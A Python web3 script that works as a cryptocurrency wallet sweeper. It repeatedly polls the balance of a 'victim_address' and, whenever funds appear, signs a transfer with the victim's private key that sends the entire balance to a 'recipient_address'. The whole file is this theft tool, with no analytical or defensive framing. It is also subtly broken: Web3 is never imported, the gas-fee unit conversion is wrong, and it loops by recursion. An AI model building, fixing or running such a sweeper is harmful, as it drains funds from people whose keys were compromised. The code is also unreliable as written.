from typing import ByteString
from eth_utils.conversions import to_hex
from eth_utils.currency import from_wei

import json
import requests
from decimal import *
from config import *

if ganache_mode:
    W3 = w3 = Web3(Web3.HTTPProvider(ganache_url))
    # W3 = Web3(Web3.HTTPProvider(ganache_url))
else:
    W3 = Web3(Web3.HTTPProvider(infura_url))

# check connecting W3 to Ganache
if  W3.is_connected() == True:
    print("started")
else :
    print("error connecting...")

balance=0

gas_fee = 21000*56  # You can change gasfee value
gas_fee = Decimal(gas_fee)
gas_fee = W3.from_wei(gas_fee,'Gwei')

print("gas fee is : ", gas_fee)
def get_balance_loop():
    balance=0
    while True:
        while 0.0005>balance:
            #Get balance account
            try:
                balance = W3.eth.get_balance(victim_address)
                balance = W3.from_wei(balance, "ether") #convert to ether value
            except:
                print("error , i can't get balance...")
                

        try:
            balance = balance-gas_fee
            print("ETH balance: ",balance)
            # print(balance)
            # print(W3.fromWei(balance, "ether"))
            build_transaction(balance)
        except:
            print("Error, check balance and Gasfee again")
            


def build_transaction(balance):
    try:
        #get nonce number
        nonce = w3.eth.get_transaction_count(victim_address)
        
        #build transaction
        tx = {
            'nonce':nonce,
            'to':recipient_address,
            'value':W3.to_wei(balance,'ether'),
            'gas':21000,
            'gasPrice':W3.to_wei('56','gwei')
        } 

        #sign transaction with private key
        signed_tx = W3.eth.account.sign_transaction(tx,victim_key)
        
        #send Transaction
        tx_hash= W3.eth.send_raw_transaction(signed_tx.rawTransaction)
        
        print(W3.to_hex(tx_hash))
        print("Transaction Completed\n GET Balance Again...")
        get_balance_loop()
    except:
        print("ERROR, check buldTransction Funcation")

get_balance_loop()
